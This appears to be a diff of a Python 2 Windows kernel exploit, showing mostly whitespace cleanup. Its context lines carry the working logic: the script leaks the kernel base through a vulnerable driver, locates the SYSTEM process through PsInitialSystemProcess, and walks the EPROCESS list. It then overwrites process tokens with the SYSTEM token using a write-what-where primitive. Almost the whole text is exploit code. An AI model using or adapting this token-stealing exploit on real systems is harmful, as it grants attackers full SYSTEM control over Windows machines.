@@ -1,6 +1,5 @@
 #!/usr/bin/python
 # -*- coding: utf-8 -*-
-
 import ctypes
 import struct
 import sys
@@ -94,7 +93,6 @@ if dwStatus != STATUS_SUCCESS:
     print ('Something went wrong while allocating memory', 'e')
     sys.exit()
 
-
 ########################################## KERNEL BASE ################################################
 
 def getkernelBase(driver):
@@ -149,7 +147,6 @@ def getkernelBase(driver):
             return (img_name, long(kernel_base, 0))
     counter += sizeof(tmp)
 
-
 ########################################### CALCULATE OFFSETS FROM KERNEL #############################################
 
 def get_PsISP_kernel_address(driver, kernel_base, img_name):
@@ -159,17 +156,12 @@ def get_PsISP_kernel_address(driver, kernel_base, img_name):
     kernel32.GetProcAddress.restype = c_uint64
 
     # Load kernel image in userland and get PsInitialSystemProcess offset
-
     kernel_handle = kernel32.LoadLibraryA(img_name)
     print '[+] Loading %s in Userland' % img_name
-
-    # print("[+] %s Userland Base Address : 0x%X" % (kernel_base, kernel_handle))
-
     PsISP_User_Address = kernel32.GetProcAddress(kernel_handle, 'PsInitialSystemProcess')
     print '[+] PsInitialSystemProcess Userland Base Address: 0x%X' % PsISP_User_Address
 
     # Calculate PsInitialSystemProcess offset in kernel land
-
     ptr_to_system_EPROCESS_struct_ptr = kernel_base + (PsISP_User_Address - kernel_handle)
     print '[+] PsInitialSystemProcess Kernel Base Address: 0x%X' % ptr_to_system_EPROCESS_struct_ptr
 
@@ -178,7 +170,6 @@ def get_PsISP_kernel_address(driver, kernel_base, img_name):
     system_EPROCESS_struct_ptr = readValueatAddress(driver, ptr_to_system_EPROCESS_struct_ptr, USER_MEM_PAGE_PTR)
     
     print "getPsISP_kernel_address Method found system_proc_struct_base_addr as: %08x" % cast(USER_MEM_PAGE_PTR, POINTER(c_ulonglong))[0]
-
     system_EPROCESS_struct_ptr = cast(USER_MEM_PAGE_PTR, POINTER(c_ulonglong))[0]
 
     return long(system_EPROCESS_struct_ptr)
@@ -283,12 +274,10 @@ def executeOverwrite():
         driver = getDriver()
         
         # Get kernel base.
-
         print "MAIN Got Driver, getting Kernel Base!"
         (img_name, kernel_base) = getkernelBase(driver)
 
         # Get system process base.
-
         print "MAIN Got Kernel Base, Getting System Process Base!"
         system_EPROCESS_struct_ptr = get_PsISP_kernel_address(driver, kernel_base, img_name)
 
@@ -325,7 +314,6 @@ def executeOverwrite():
             nextflink = cast(USER_ADDR_OFFSET, POINTER(c_ulonglong))[0]
             print "That pointer points to nextFlink: " + hex(nextflink)
 
-           
             where = flinkEPROCESS+TOKEN_OFFSET
             print "Writing to: " + hex(where)
             writeWhatWhere(driver, system_token_value, where)
@@ -337,7 +325,6 @@ def executeOverwrite():
 
             if total_writes >200:
                 break
-        
 
 ############################################ RUN ################################################
 
